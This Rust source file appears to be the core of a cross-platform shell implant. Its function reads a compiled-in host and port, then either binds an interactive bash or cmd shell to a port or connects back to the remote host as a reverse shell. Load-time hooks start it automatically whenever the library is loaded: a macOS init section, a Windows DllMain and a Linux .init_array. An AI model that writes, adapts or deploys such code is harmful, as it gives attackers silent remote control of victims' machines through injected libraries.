use log::LevelFilter;
use simple_logger::SimpleLogger;
use std::str;

mod utils;

#[cfg(target_os = "windows")]
mod conpty;

#[cfg(not(target_os = "windows"))]
mod xnix;
#[cfg(not(target_os = "windows"))]
use xnix::{bind ,rconnect };
#[cfg(target_os = "windows")]
mod win;
#[cfg(target_os = "windows")]
use win::{bind , connect ,rbind ,rconnect };


pub static ADDR: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/hosturl"));
pub static PORT: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/port"));
pub static BIND_SHELL: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/bind"));


pub fn runclient() {
    let addr_string = match str::from_utf8(ADDR) {
        Ok(a) => a,
        Err(e) => panic!("unable to decode url bytes: {:?}", e),
    };

    let port_string = match str::from_utf8(PORT) {
        Ok(p) => p,
        Err(e) => panic!("unable to decode url bytes: {:?}", e),
    };

    let enable_bindshell = match str::from_utf8(BIND_SHELL) {
        Ok(enable) => enable,
        Err(e) => panic!("unable to decode bindshell bytes: {:?}", e),
    };

    #[cfg(not(target_os="windows"))]
    let subprocess = "bash";
    #[cfg(not(target_os="windows"))]
    let mut full_args:Vec<String> = Vec::new();
    full_args.push("-i".parse().unwrap());

    #[cfg(target_os = "windows")]
    let subprocess = "cmd";

    #[cfg(target_os = "windows")]
        let mut full_args:Vec<String> = Vec::new();

    #[cfg(target_os = "windows")]
        full_args.push("".parse().unwrap());


    if enable_bindshell.eq("1") {
        bind(port_string.parse().unwrap(), subprocess.parse().unwrap(), full_args);
    } else {
        let url = format!("{}:{}", addr_string, port_string);
        rconnect(url, subprocess.parse().unwrap(), full_args);
    }

}

#[cfg(target_os = "macos")]
#[cfg_attr(target_os = "macos", link_section = "__DATA,__mod_init_func")]
pub static INITIALIZE: extern "C" fn() = dylib_main;
#[no_mangle]
pub extern "C" fn dylib_main() {
    runclient();
}

#[no_mangle]
#[cfg(target_os = "windows")]
extern "system" fn DllMain(dll_module: *const u8, call_reason: u32, reserved: *const u8) -> u32 {
    const DLL_PROCESS_ATTACH: DWORD = 1;
    const DLL_PROCESS_DETACH: DWORD = 0;
    match call_reason {
        DLL_PROCESS_ATTACH => {
            runclient();
        },
        DLL_PROCESS_DETACH => (),
        _ => (),
    }
    return 0;
}

#[cfg(target_os = "linux")]
#[cfg_attr(target_os = "linux", link_section = ".init_array")]
pub extern fn shared_object_main() {
    runclient();
}